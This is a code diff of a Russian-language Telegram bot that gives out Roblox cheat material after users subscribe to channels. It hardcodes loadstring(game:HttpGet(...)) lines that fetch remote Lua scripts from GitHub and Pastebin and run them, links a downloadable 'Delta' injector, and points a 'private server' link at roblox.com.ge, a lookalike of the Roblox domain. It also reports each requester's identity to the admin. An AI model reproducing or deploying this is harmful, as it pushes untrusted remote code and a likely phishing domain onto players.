@@ -15,25 +15,29 @@ BOT_USERNAME = "larskeys_bot"
 
 DB_FILE = os.path.join(os.path.dirname(os.path.abspath(__file__)), "bot_users.db")
 
+# Вшитые реферальные ссылки (не стираются при сбросе базы)
+HARDCODED_REFS = {
+    "5e185ffd": "Спасибо за подписку! Вот скрипт:\n\nloadstring(game:HttpGet(\"https://raw.githubusercontent.com/fsfsfss323/key_system.lua/refs/heads/main/script.lua\"))()",
+    "55fd5fde": "loadstring(game:HttpGet(\"https://raw.githubusercontent.com/fsfsfss323/selllemon.lua/refs/heads/main/sellemon.lua\"))()",
+    "371bb522": "loadstring(game:HttpGet(\"https://raw.githubusercontent.com/fsfsfss323/cherber.lua/refs/heads/main/cherber.lua\"))()",
+}
+
 def init_db():
     conn = sqlite3.connect(DB_FILE)
     c = conn.cursor()
-    c.execute("CREATE TABLE IF NOT EXISTS users (user_id INTEGER PRIMARY KEY, ref_code TEXT, invited_by INTEGER, invites INTEGER DEFAULT 0, got_private INTEGER DEFAULT 0)")
+    c.execute("CREATE TABLE IF NOT EXISTS users (user_id INTEGER PRIMARY KEY, ref_code TEXT)")
     c.execute("CREATE TABLE IF NOT EXISTS ref_links (id INTEGER PRIMARY KEY AUTOINCREMENT, link TEXT UNIQUE, message TEXT)")
     conn.commit()
     conn.close()
 
-def add_user(user_id, ref_code=None, invited_by=None):
+def add_user(user_id, ref_code=None):
     conn = sqlite3.connect(DB_FILE)
     c = conn.cursor()
-    c.execute("SELECT user_id, invites, got_private FROM users WHERE user_id = ?", (user_id,))
+    c.execute("SELECT user_id FROM users WHERE user_id = ?", (user_id,))
     exists = c.fetchone()
     if not exists:
-        c.execute("INSERT INTO users (user_id, ref_code, invited_by, invites, got_private) VALUES (?, ?, ?, 0, 0)", (user_id, ref_code, invited_by))
+        c.execute("INSERT INTO users (user_id, ref_code) VALUES (?, ?)", (user_id, ref_code))
         conn.commit()
-        if invited_by:
-            c.execute("UPDATE users SET invites = invites + 1 WHERE user_id = ?", (invited_by,))
-            conn.commit()
         conn.close()
         return True
     else:
@@ -43,14 +47,6 @@ def add_user(user_id, ref_code=None, invited_by=None):
     conn.close()
     return False
 
-def get_user_data(user_id):
-    conn = sqlite3.connect(DB_FILE)
-    c = conn.cursor()
-    c.execute("SELECT ref_code, invited_by, invites, got_private FROM users WHERE user_id = ?", (user_id,))
-    row = c.fetchone()
-    conn.close()
-    return row
-
 def get_user_ref_code(user_id):
     conn = sqlite3.connect(DB_FILE)
     c = conn.cursor()
@@ -58,29 +54,6 @@ def get_user_ref_code(user_id):
     row = c.fetchone()
     conn.close()
     return row[0] if row else None
-
-def get_inviter(user_id):
-    conn = sqlite3.connect(DB_FILE)
-    c = conn.cursor()
-    c.execute("SELECT invited_by FROM users WHERE user_id = ?", (user_id,))
-    row = c.fetchone()
-    conn.close()
-    return row[0] if row else None
-
-def get_invites_count(user_id):
-    conn = sqlite3.connect(DB_FILE)
-    c = conn.cursor()
-    c.execute("SELECT invites FROM users WHERE user_id = ?", (user_id,))
-    row = c.fetchone()
-    conn.close()
-    return row[0] if row else 0
-
-def set_got_private(user_id):
-    conn = sqlite3.connect(DB_FILE)
-    c = conn.cursor()
-    c.execute("UPDATE users SET got_private = 1 WHERE user_id = ?", (user_id,))
-    conn.commit()
-    conn.close()
 
 def create_ref_link(message):
     conn = sqlite3.connect(DB_FILE)
@@ -92,6 +65,8 @@ def create_ref_link(message):
     return ref
 
 def get_ref_message(ref):
+    if ref in HARDCODED_REFS:
+        return HARDCODED_REFS[ref]
     conn = sqlite3.connect(DB_FILE)
     c = conn.cursor()
     c.execute("SELECT message FROM ref_links WHERE link = ?", (ref,))
@@ -142,7 +117,6 @@ KEYS = ["МОПС", "СКИТ", "ТАКСА", "КИТ", "LARS", "MOPS", "ARDOR",
 PRIVATE_SERVER_LINK = "https://roblox.com.ge/games/142823291/Murder-Mystery-2?privateServerLinkCode=67807728184198406550153024608844"
 SCRIPT_LINK = "loadstring(game:HttpGet(\"https://pastebin.com/raw/GdQULgA6\"))()"
 DELTA_LINK = "https://drive.google.com/file/d/1G2gniClYv0qV0BU9-xfYD4UOcxUljH4s/view?usp=sharing"
-TIKTOK_PASSWORD = "я с тик тока"
 
 bot = telebot.TeleBot(TOKEN)
 
@@ -190,21 +164,6 @@ def get_success_keyboard():
     keyboard.add(types.InlineKeyboardButton(text="📥 Скачать инжектор (Delta)", url=DELTA_LINK))
     return keyboard
 
-def get_invite_keyboard(user_id):
-    ref = get_user_ref_code(user_id)
-    if not ref:
-        ref = str(uuid.uuid4())[:8]
-        conn = sqlite3.connect(DB_FILE)
-        c = conn.cursor()
-        c.execute("UPDATE users SET ref_code = ? WHERE user_id = ?", (ref, user_id))
-        conn.commit()
-        conn.close()
-    link = f"https://t.me/{BOT_USERNAME}?start=ref_{ref}"
-    keyboard = types.InlineKeyboardMarkup(row_width=1)
-    keyboard.add(types.InlineKeyboardButton(text="🔗 Моя ссылка для приглашений", url=f"https://t.me/share/url?url={link}&text=Привет! Получи скрипт бесплатно!"))
-    keyboard.add(types.InlineKeyboardButton(text="🔍 Проверить приглашения", callback_data="check_invites"))
-    return keyboard
-
 def get_admin_keyboard():
     keyboard = types.InlineKeyboardMarkup(row_width=2)
     keyboard.add(types.InlineKeyboardButton("📊 Статистика", callback_data="admin_stats"))
@@ -220,24 +179,11 @@ def start(message):
     args = message.text.split()
     is_ref = len(args) > 1 and args[1].startswith("ref_")
     ref_code = args[1].replace("ref_", "") if is_ref else None
-    
-    invited_by = None
-    if is_ref:
-        conn = sqlite3.connect(DB_FILE)
-        c = conn.cursor()
-        c.execute("SELECT user_id FROM users WHERE ref_code = ?", (ref_code,))
-        row = c.fetchone()
-        conn.close()
-        if row:
-            invited_by = row[0]
-    
-    is_new = add_user(message.from_user.id, None, invited_by)
+    is_new = add_user(message.from_user.id, ref_code)
     
     if is_new:
         user = message.from_user
         notify_admin(f"🆕 Новый пользователь!\n\n🆔 ID: {user.id}\n👤 Имя: {user.first_name}\n📛 @{user.username or 'нет'}\n👥 Всего: {count_users()}")
-        if invited_by:
-            bot.send_message(invited_by, f"🎉 Кто-то перешёл по твоей ссылке!\n\nУ тебя уже {get_invites_count(invited_by)} приглашений. Нужно 5 для приватки.")
     
     if is_ref:
         bot.send_message(message.chat.id, "🔗 Ты перешёл по реферальной ссылке!\n\nПодпишись на каналы и нажми проверить:", reply_markup=get_channels_keyboard(is_ref=True))
@@ -258,8 +204,8 @@ def getkey(message):
 def admin_panel(message):
     if not is_admin(message.from_user.id):
         return
-    refs = len(get_all_ref_links())
-    bot.send_message(message.chat.id, f"🛡 Админ панель\n\n👥 Пользователей: {count_users()}\n🔗 Реф. ссылок: {refs}\n\nВыбери действие:", reply_markup=get_admin_keyboard())
+    refs = len(get_all_ref_links()) + len(HARDCODED_REFS)
+    bot.send_message(message.chat.id, f"🛡 Админ панель\n\n👥 Пользователей: {count_users()}\n🔗 Реф. ссылок: {refs} (вшитых: {len(HARDCODED_REFS)})\n\nВыбери действие:", reply_markup=get_admin_keyboard())
 
 @bot.message_handler(func=lambda m: m.text == ADMIN_SECRET2)
 def broadcast_panel(message):
@@ -289,7 +235,8 @@ def user_callback(call):
         not_subbed = get_unsubscribed_channels(user_id)
         if not not_subbed:
             if is_ref:
-                ref_msg = get_ref_message(get_user_ref_code(user_id))
+                ref_code = get_user_ref_code(user_id)
+                ref_msg = get_ref_message(ref_code) if ref_code else None
                 bot.send_message(call.message.chat.id, ref_msg if ref_msg else "✅ Подписка подтверждена!")
             else:
                 bot.send_message(call.message.chat.id, "✅ Подписка подтверждена!\n\nВыбери что хочешь получить:", reply_markup=get_success_keyboard())
@@ -302,30 +249,18 @@ def user_callback(call):
     elif action == "get_script":
         bot.send_message(call.message.chat.id, f"📜 Скрипт на все игры:\n\n{SCRIPT_LINK}")
         bot.answer_callback_query(call.id)
+        user = call.from_user
+        notify_admin(f"📥 Запросили скрипт!\n\n👤 {user.first_name}\n📛 @{user.username or 'нет'}\n🆔 {user.id}")
     
     elif action == "get_key":
         k = random.choice(KEYS)
         bot.send_message(call.message.chat.id, f"🔑 Твой ключ:\n\n{k}")
         bot.answer_callback_query(call.id)
+        user = call.from_user
+        notify_admin(f"🔑 Запросили ключ!\n\n👤 {user.first_name}\n📛 @{user.username or 'нет'}\n🆔 {user.id}\n🔑 Ключ: {k}")
     
     elif action == "get_private":
-        user_data = get_user_data(user_id)
-        invites = user_data[2] if user_data else 0
-        
-        if invites >= 5:
-            bot.send_message(call.message.chat.id, f"🔒 Приватный сервер MM2\n\n{PRIVATE_SERVER_LINK}")
-            bot.answer_callback_query(call.id, "Приватка отправлена!")
-        else:
-            remaining = 5 - invites
-            bot.send_message(call.message.chat.id, f"🔒 Для получения приватки нужно пригласить 5 человек.\n\nУ тебя: {invites}/5\nОсталось: {remaining}\n\nПригласи друзей по ссылке ниже:", reply_markup=get_invite_keyboard(user_id))
-            bot.answer_callback_query(call.id, f"Нужно ещё {remaining} приглашений")
-    
-    elif action == "check_invites":
-        invites = get_invites_count(user_id)
-        if invites >= 5:
-            bot.send_message(call.message.chat.id, f"✅ У тебя {invites} приглашений! Можешь получить приватку.\n\nНажми кнопку Приватный сервер MM2 в главном меню.")
-        else:
-            bot.send_message(call.message.chat.id, f"📊 У тебя {invites}/5 приглашений. Нужно ещё {5 - invites}.")
+        bot.send_message(call.message.chat.id, f"🔒 Приватный сервер MM2\n\n{PRIVATE_SERVER_LINK}")
         bot.answer_callback_query(call.id)
     
     elif action == "admin_ref_create":
@@ -339,11 +274,13 @@ def user_callback(call):
         if not is_admin(user_id):
             return
         links = get_all_ref_links()
-        if not links:
-            bot.send_message(call.message.chat.id, "🔗 Нет реферальных ссылок.")
-        else:
-            text = "\n".join(f"• {l[1]} — {l[2][:30]}" for l in links)
-            bot.send_message(call.message.chat.id, f"🔗 Реф. ссылки ({len(links)}):\n\n{text}")
+        text = "📋 Вшитые ссылки:\n"
+        for ref, msg in HARDCODED_REFS.items():
+            text += f"• {ref} — {msg[:40]}...\n"
+        text += f"\n📋 Ссылки из базы ({len(links)}):\n"
+        for l in links:
+            text += f"• {l[1]} — {l[2][:30]}...\n" if l[2] else f"• {l[1]}\n"
+        bot.send_message(call.message.chat.id, text)
         bot.answer_callback_query(call.id)
     
     elif action == "admin_ref_del":
@@ -351,7 +288,7 @@ def user_callback(call):
             return
         links = get_all_ref_links()
         if not links:
-            bot.send_message(call.message.chat.id, "🔗 Нет реферальных ссылок.")
+            bot.send_message(call.message.chat.id, "🔗 Нет ссылок для удаления (вшитые удалить нельзя).")
         else:
             keyboard = types.InlineKeyboardMarkup(row_width=1)
             for l in links:
@@ -370,8 +307,8 @@ def user_callback(call):
     elif action == "admin_stats":
         if not is_admin(user_id):
             return
-        refs = len(get_all_ref_links())
-        bot.send_message(call.message.chat.id, f"📊 Статистика:\n👥 Пользователей: {count_users()}\n🔗 Реф. ссылок: {refs}")
+        refs = len(get_all_ref_links()) + len(HARDCODED_REFS)
+        bot.send_message(call.message.chat.id, f"📊 Статистика:\n👥 Пользователей: {count_users()}\n🔗 Реф. ссылок: {refs} (вшитых: {len(HARDCODED_REFS)})")
         bot.answer_callback_query(call.id)
     
     elif action == "admin_users_list":
@@ -396,16 +333,6 @@ def user_callback(call):
     
     else:
         bot.answer_callback_query(call.id)
-
-@bot.message_handler(func=lambda m: m.text == TIKTOK_PASSWORD)
-def tiktok_private(message):
-    add_user(message.from_user.id)
-    user_data = get_user_data(message.from_user.id)
-    if user_data and user_data[3] == 1:
-        bot.send_message(message.chat.id, "Ты уже получил приватку!")
-    else:
-        set_got_private(message.from_user.id)
-        bot.send_message(message.chat.id, f"🔒 Приватный сервер MM2 (для подписчиков с TikTok):\n\n{PRIVATE_SERVER_LINK}")
 
 def create_ref_with_message(message):
     msg_text = message.text
